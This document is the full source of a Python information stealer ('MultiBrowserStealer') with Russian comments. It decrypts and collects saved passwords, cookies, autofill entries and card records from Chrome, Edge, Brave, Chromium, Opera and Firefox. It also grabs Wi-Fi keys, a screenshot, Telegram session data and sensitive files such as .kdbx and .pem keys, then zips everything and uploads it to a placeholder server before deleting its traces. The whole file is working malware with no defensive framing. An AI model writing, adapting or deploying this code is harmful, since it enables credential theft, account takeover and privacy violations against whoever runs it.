# -*- coding: utf-8 -*-
# Импорт библиотек
import os
import sys
import json
import shutil
import sqlite3
import zipfile
import base64
import platform
import subprocess
import requests
import socket
import psutil
import re
from datetime import datetime
from pathlib import Path
from PIL import ImageGrab
from Crypto.Cipher import AES
import win32crypt
import json as json_module

# ===== НАСТРОЙКИ СЕРВЕРА =====
SERVER_URL = "https://твой-домен.com/upload.php"  # URL к upload.php
AUTH_KEY = "ТВОЙ_СЕКРЕТНЫЙ_КЛЮЧ_12345"           # Ключ авторизации
# =============================

class MultiBrowserStealer:
    def __init__(self):
        self.temp_dir = os.path.join(os.environ.get('TEMP', '.'), 'SysCache_Update')
        self.zip_path = os.path.join(self.temp_dir, 'data_bundle.zip')
        self.data_dir = os.path.join(self.temp_dir, 'extracted_data')
        os.makedirs(self.temp_dir, exist_ok=True)
        os.makedirs(self.data_dir, exist_ok=True)
        
        # Пути ко всем 6 браузерам
        self.browser_configs = {
            'chrome': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data'),
                'type': 'chromium',
                'profiles': ['Default', 'Profile 1', 'Profile 2', 'Profile 3']
            },
            'edge': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data'),
                'type': 'chromium',
                'profiles': ['Default', 'Profile 1', 'Profile 2']
            },
            'brave': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data'),
                'type': 'chromium',
                'profiles': ['Default', 'Profile 1']
            },
            'chromium': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Chromium', 'User Data'),
                'type': 'chromium',
                'profiles': ['Default', 'Profile 1']
            },
            'opera': {
                'path': os.path.join(os.environ.get('APPDATA', ''), 'Opera Software', 'Opera Stable'),
                'type': 'chromium',
                'profiles': ['Default']
            },
            'firefox': {
                'path': os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles'),
                'type': 'firefox',
                'profiles': []  # Для Firefox профили сканируются автоматически
            }
        }

    # ===== МЕТОДЫ ДЛЯ CHROMIUM-БРАУЗЕРОВ (Chrome, Edge, Brave, Chromium, Opera) =====
    
    def get_chromium_encryption_key(self, browser_path):
        """Извлечение ключа шифрования для браузеров Chromium"""
        try:
            local_state_path = os.path.join(browser_path, 'Local State')
            if not os.path.exists(local_state_path):
                return None
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json_module.load(f)
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Удаление префикса 'DPAPI'
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return decrypted_key
        except:
            return None

    def decrypt_chromium_value(self, encrypted_value, key):
        """Расшифровка значения с использованием AES-GCM"""
        try:
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted[:-16].decode('utf-8', errors='ignore')  # Удаление тега аутентификации
        except:
            try:
                # Попытка расшифровки через DPAPI (старый метод)
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
            except:
                return ""

    def extract_chromium_passwords(self, browser_name, browser_path, profiles):
        """Извлечение паролей из браузеров на Chromium"""
        passwords = []
        key = self.get_chromium_encryption_key(browser_path)
        if not key:
            return passwords
        
        for profile in profiles:
            login_db = os.path.join(browser_path, profile, 'Login Data')
            if not os.path.exists(login_db):
                continue
            try:
                temp_db = os.path.join(self.temp_dir, f'{browser_name}_{profile}_login.db')
                shutil.copy2(login_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins')
                for row in cursor.fetchall():
                    url = row[0] or ''
                    username = row[1] or ''
                    encrypted_pw = row[2]
                    if encrypted_pw:
                        decrypted_pw = self.decrypt_chromium_value(encrypted_pw, key)
                        if decrypted_pw:
                            passwords.append({
                                'browser': browser_name,
                                'profile': profile,
                                'url': url,
                                'username': username,
                                'password': decrypted_pw,
                            })
                conn.close()
                os.remove(temp_db)
            except Exception as e:
                pass
        return passwords

    def extract_chromium_cookies(self, browser_name, browser_path, profiles):
        """Извлечение cookies из браузеров Chromium"""
        cookies = []
        key = self.get_chromium_encryption_key(browser_path)
        if not key:
            return cookies
        
        for profile in profiles:
            # Проверка разных путей к cookies
            cookie_paths = [
                os.path.join(browser_path, profile, 'Network', 'Cookies'),
                os.path.join(browser_path, profile, 'Cookies'),
            ]
            for cookie_db in cookie_paths:
                if not os.path.exists(cookie_db):
                    continue
                try:
                    temp_db = os.path.join(self.temp_dir, f'{browser_name}_{profile}_cookies.db')
                    shutil.copy2(cookie_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies')
                    for row in cursor.fetchall():
                        encrypted_val = row[2]
                        if encrypted_val:
                            decrypted_val = self.decrypt_chromium_value(encrypted_val, key)
                            if decrypted_val:
                                cookies.append({
                                    'browser': browser_name,
                                    'profile': profile,
                                    'host': row[0] or '',
                                    'name': row[1] or '',
                                    'value': decrypted_val,
                                    'path': row[3] or '',
                                    'secure': bool(row[5]),
                                    'httponly': bool(row[6]),
                                })
                    conn.close()
                    os.remove(temp_db)
                    break  # Нашли и обработали - выходим
                except:
                    pass
        return cookies

    def extract_chromium_autofill(self, browser_name, browser_path, profiles):
        """Извлечение данных автозаполнения"""
        autofill = []
        for profile in profiles:
            web_data = os.path.join(browser_path, profile, 'Web Data')
            if not os.path.exists(web_data):
                continue
            try:
                temp_db = os.path.join(self.temp_dir, f'{browser_name}_{profile}_webdata.db')
                shutil.copy2(web_data, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                # Автозаполнение форм
                cursor.execute('SELECT name, value, value_lower, date_created FROM autofill')
                for row in cursor.fetchall():
                    autofill.append({
                        'browser': browser_name,
                        'profile': profile,
                        'type': 'autofill',
                        'field': row[0] or '',
                        'value': row[1] or '',
                    })
                # Кредитные карты
                try:
                    cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards')
                    for row in cursor.fetchall():
                        autofill.append({
                            'browser': browser_name,
                            'profile': profile,
                            'type': 'credit_card',
                            'name_on_card': row[0] or '',
                            'exp_month': row[1] or '',
                            'exp_year': row[2] or '',
                            'card_number_enc': base64.b64encode(row[3]).decode() if row[3] else '',
                        })
                except:
                    pass
                conn.close()
                os.remove(temp_db)
            except:
                pass
        return autofill

    def extract_chromium_history(self, browser_name, browser_path, profiles):
        """Извлечение истории посещений"""
        history = []
        for profile in profiles:
            history_db = os.path.join(browser_path, profile, 'History')
            if not os.path.exists(history_db):
                continue
            try:
                temp_db = os.path.join(self.temp_dir, f'{browser_name}_{profile}_history.db')
                shutil.copy2(history_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 200')
                for row in cursor.fetchall():
                    history.append({
                        'browser': browser_name,
                        'profile': profile,
                        'url': row[0] or '',
                        'title': row[1] or '',
                        'visit_count': row[2] or 0,
                    })
                conn.close()
                os.remove(temp_db)
            except:
                pass
        return history

    def extract_chromium_bookmarks(self, browser_name, browser_path, profiles):
        """Извлечение закладок"""
        bookmarks = []
        for profile in profiles:
            bookmarks_file = os.path.join(browser_path, profile, 'Bookmarks')
            if not os.path.exists(bookmarks_file):
                continue
            try:
                with open(bookmarks_file, 'r', encoding='utf-8') as f:
                    data = json_module.load(f)
                roots = data.get('roots', {})
                for root_name, root_data in roots.items():
                    if isinstance(root_data, dict):
                        items = root_data.get('children', [])
                        for item in items:
                            if item.get('type') == 'url':
                                bookmarks.append({
                                    'browser': browser_name,
                                    'profile': profile,
                                    'folder': root_name,
                                    'name': item.get('name', ''),
                                    'url': item.get('url', ''),
                                })
            except:
                pass
        return bookmarks

    # ===== МЕТОДЫ ДЛЯ FIREFOX =====

    def get_firefox_profiles(self, firefox_path):
        """Получение списка профилей Firefox"""
        profiles = []
        try:
            profiles_ini = os.path.join(firefox_path, 'profiles.ini')
            if os.path.exists(profiles_ini):
                with open(profiles_ini, 'r', encoding='utf-8') as f:
                    content = f.read()
                # Парсинг profiles.ini
                pattern = r'Path=(.*?)(?:\n|$)'
                matches = re.findall(pattern, content)
                for match in matches:
                    if not match.startswith('/'):
                        profile_full_path = os.path.join(firefox_path, match.strip())
                    else:
                        profile_full_path = match.strip()
                    if os.path.exists(profile_full_path):
                        profiles.append(profile_full_path)
        except:
            pass
        
        # Если профили не найдены через ini, сканируем папки
        if not profiles:
            try:
                for item in os.listdir(firefox_path):
                    item_path = os.path.join(firefox_path, item)
                    if os.path.isdir(item_path) and item != 'Crash Reports':
                        if os.path.exists(os.path.join(item_path, 'logins.json')):
                            profiles.append(item_path)
            except:
                pass
        return profiles

    def extract_firefox_passwords(self, profile_path):
        """Извлечение паролей Firefox"""
        passwords = []
        logins_file = os.path.join(profile_path, 'logins.json')
        if not os.path.exists(logins_file):
            return passwords
        
        key4_file = os.path.join(profile_path, 'key4.db')
        if not os.path.exists(key4_file):
            return passwords
        
        try:
            # Чтение logins.json
            with open(logins_file, 'r', encoding='utf-8') as f:
                data = json_module.load(f)
            
            logins = data.get('logins', [])
            for login in logins:
                passwords.append({
                    'browser': 'firefox',
                    'profile': os.path.basename(profile_path),
                    'url': login.get('hostname', ''),
                    'username': login.get('encryptedUsername', ''),
                    'password': login.get('encryptedPassword', ''),
                    'encrypted': True,  # Требуется дополнительная расшифровка
                })
        except:
            pass
        return passwords

    def extract_firefox_cookies(self, profile_path):
        """Извлечение cookies Firefox"""
        cookies = []
        cookies_db = os.path.join(profile_path, 'cookies.sqlite')
        if not os.path.exists(cookies_db):
            return cookies
        
        try:
            temp_db = os.path.join(self.temp_dir, f'firefox_{os.path.basename(profile_path)}_cookies.db')
            shutil.copy2(cookies_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies')
            for row in cursor.fetchall():
                cookies.append({
                    'browser': 'firefox',
                    'profile': os.path.basename(profile_path),
                    'host': row[0] or '',
                    'name': row[1] or '',
                    'value': row[2] or '',
                    'path': row[3] or '',
                    'secure': bool(row[5]),
                    'httponly': bool(row[6]),
                })
            conn.close()
            os.remove(temp_db)
        except:
            pass
        return cookies

    def extract_firefox_history(self, profile_path):
        """Извлечение истории Firefox"""
        history = []
        places_db = os.path.join(profile_path, 'places.sqlite')
        if not os.path.exists(places_db):
            return history
        
        try:
            temp_db = os.path.join(self.temp_dir, f'firefox_{os.path.basename(profile_path)}_places.db')
            shutil.copy2(places_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 200')
            for row in cursor.fetchall():
                history.append({
                    'browser': 'firefox',
                    'profile': os.path.basename(profile_path),
                    'url': row[0] or '',
                    'title': row[1] or '',
                    'visit_count': row[2] or 0,
                })
            conn.close()
            os.remove(temp_db)
        except:
            pass
        return history

    def extract_firefox_bookmarks(self, profile_path):
        """Извлечение закладок Firefox"""
        bookmarks = []
        places_db = os.path.join(profile_path, 'places.sqlite')
        if not os.path.exists(places_db):
            return bookmarks
        
        try:
            temp_db = os.path.join(self.temp_dir, f'firefox_{os.path.basename(profile_path)}_bookmarks.db')
            shutil.copy2(places_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('''
                SELECT b.title, p.url 
                FROM moz_bookmarks b 
                JOIN moz_places p ON b.fk = p.id 
                WHERE b.type = 1
            ''')
            for row in cursor.fetchall():
                bookmarks.append({
                    'browser': 'firefox',
                    'profile': os.path.basename(profile_path),
                    'title': row[0] or '',
                    'url': row[1] or '',
                })
            conn.close()
            os.remove(temp_db)
        except:
            pass
        return bookmarks

    # ===== ОБЩИЕ МЕТОДЫ СБОРА =====

    def get_system_info(self):
        """Сбор информации о системе"""
        info = {
            'os': platform.system(),
            'os_version': platform.version(),
            'hostname': socket.gethostname(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'ram_gb': round(psutil.virtual_memory().total / (1024**3), 2),
            'username': os.environ.get('USERNAME', 'unknown'),
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        }
        try:
            info['ip'] = requests.get('https://api.ipify.org', timeout=5).text.strip()
        except:
            info['ip'] = 'unknown'
        return info

    def extract_wifi_passwords(self):
        """Извлечение WiFi паролей"""
        wifi_list = []
        try:
            if platform.system() == 'Windows':
                output = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profiles'],
                    capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
                ).stdout
                profiles = [line.split(':')[1].strip() for line in output.split('\n') if 'All User Profile' in line]
                for profile in profiles:
                    details = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                        capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
                    ).stdout
                    for line in details.split('\n'):
                        if 'Key Content' in line:
                            wifi_list.append({'ssid': profile, 'password': line.split(':')[1].strip()})
        except:
            pass
        return wifi_list

    def capture_screenshot(self):
        """Создание скриншота"""
        path = os.path.join(self.data_dir, 'screenshot.png')
        try:
            img = ImageGrab.grab(all_screens=True)
            img.save(path, 'PNG')
            return path
        except:
            return None

    def steal_telegram_sessions(self):
        """Кража сессий Telegram"""
        try:
            tdata_path = os.path.join(os.environ.get('APPDATA', ''), 'Telegram Desktop', 'tdata')
            if os.path.exists(tdata_path):
                dest = os.path.join(self.data_dir, 'telegram_tdata')
                shutil.copytree(tdata_path, dest, dirs_exist_ok=True)
                return dest
        except:
            pass
        return None

    def collect_desktop_documents(self):
        """Сбор файлов с рабочего стола и документов"""
        collected = []
        target_dirs = [
            os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Documents'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Downloads'),
        ]
        for directory in target_dirs:
            if not os.path.exists(directory):
                continue
            for root, _, files in os.walk(directory):
                for file in files:
                    if file.endswith(('.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.png', '.kdbx', '.rdp', '.pem', '.key')):
                        filepath = os.path.join(root, file)
                        try:
                            if os.path.getsize(filepath) < 10 * 1024 * 1024:  # До 10 МБ
                                dest = os.path.join(self.data_dir, 'files', os.path.basename(filepath))
                                os.makedirs(os.path.dirname(dest), exist_ok=True)
                                shutil.copy2(filepath, dest)
                                collected.append(filepath)
                        except:
                            pass
        return collected

    def run_all_extractions(self):
        """Запуск всех извлечений"""
        all_data = {
            'system_info': self.get_system_info(),
            'passwords': [],
            'cookies': [],
            'autofill': [],
            'history': [],
            'bookmarks': [],
            'wifi_passwords': self.extract_wifi_passwords(),
        }
        
        # Обход всех браузеров
        for browser_name, config in self.browser_configs.items():
            browser_path = config['path']
            
            if config['type'] == 'chromium':
                if os.path.exists(browser_path):
                    # Пароли
                    passwords = self.extract_chromium_passwords(browser_name, browser_path, config['profiles'])
                    all_data['passwords'].extend(passwords)
                    
                    # Cookies
                    cookies = self.extract_chromium_cookies(browser_name, browser_path, config['profiles'])
                    all_data['cookies'].extend(cookies)
                    
                    # Автозаполнение
                    autofill = self.extract_chromium_autofill(browser_name, browser_path, config['profiles'])
                    all_data['autofill'].extend(autofill)
                    
                    # История
                    history = self.extract_chromium_history(browser_name, browser_path, config['profiles'])
                    all_data['history'].extend(history)
                    
                    # Закладки
                    bookmarks = self.extract_chromium_bookmarks(browser_name, browser_path, config['profiles'])
                    all_data['bookmarks'].extend(bookmarks)
                    
            elif config['type'] == 'firefox':
                if os.path.exists(browser_path):
                    firefox_profiles = self.get_firefox_profiles(browser_path)
                    for profile_path in firefox_profiles:
                        # Пароли
                        passwords = self.extract_firefox_passwords(profile_path)
                        all_data['passwords'].extend(passwords)
                        
                        # Cookies
                        cookies = self.extract_firefox_cookies(profile_path)
                        all_data['cookies'].extend(cookies)
                        
                        # История
                        history = self.extract_firefox_history(profile_path)
                        all_data['history'].extend(history)
                        
                        # Закладки
                        bookmarks = self.extract_firefox_bookmarks(profile_path)
                        all_data['bookmarks'].extend(bookmarks)
        
        return all_data

    def create_zip_and_send(self):
        """Создание ZIP и отправка на сервер"""
        # Сбор всех данных
        all_data = self.run_all_extractions()
        
        # Сохранение JSON с данными
        json_path = os.path.join(self.data_dir, 'full_data.json')
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(all_data, f, indent=4, ensure_ascii=False, default=str)
        
        # Скриншот
        self.capture_screenshot()
        
        # Telegram сессии
        self.steal_telegram_sessions()
        
        # Файлы с рабочего стола
        self.collect_desktop_documents()
        
        # Создание ZIP
        zip_path = os.path.join(self.temp_dir, 'bundle.zip')
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, _, files in os.walk(self.data_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, self.data_dir)
                    zf.write(file_path, arcname)
        
        # Отправка на сервер
        self.send_to_server(zip_path, all_data)

    def send_to_server(self, zip_path, all_data):
        """Отправка архива на сервер через upload.php"""
        try:
            with open(zip_path, 'rb') as f:
                files = {'file': ('bundle.zip', f, 'application/zip')}
                data = {
                    'auth_key': AUTH_KEY,
                    'hostname': all_data['system_info']['hostname'],
                    'username': all_data['system_info']['username'],
                    'os': all_data['system_info']['os'],
                    'ip': all_data['system_info']['ip'],
                    'timestamp': all_data['system_info']['timestamp'],
                }
                response = requests.post(SERVER_URL, files=files, data=data, timeout=30)
        except:
            pass
        finally:
            self.cleanup()

    def cleanup(self):
        """Очистка временных файлов"""
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
        except:
            pass

# Точка входа
if __name__ == '__main__':
    try:
        stealer = MultiBrowserStealer()
        stealer.create_zip_and_send()
    except:
        pass
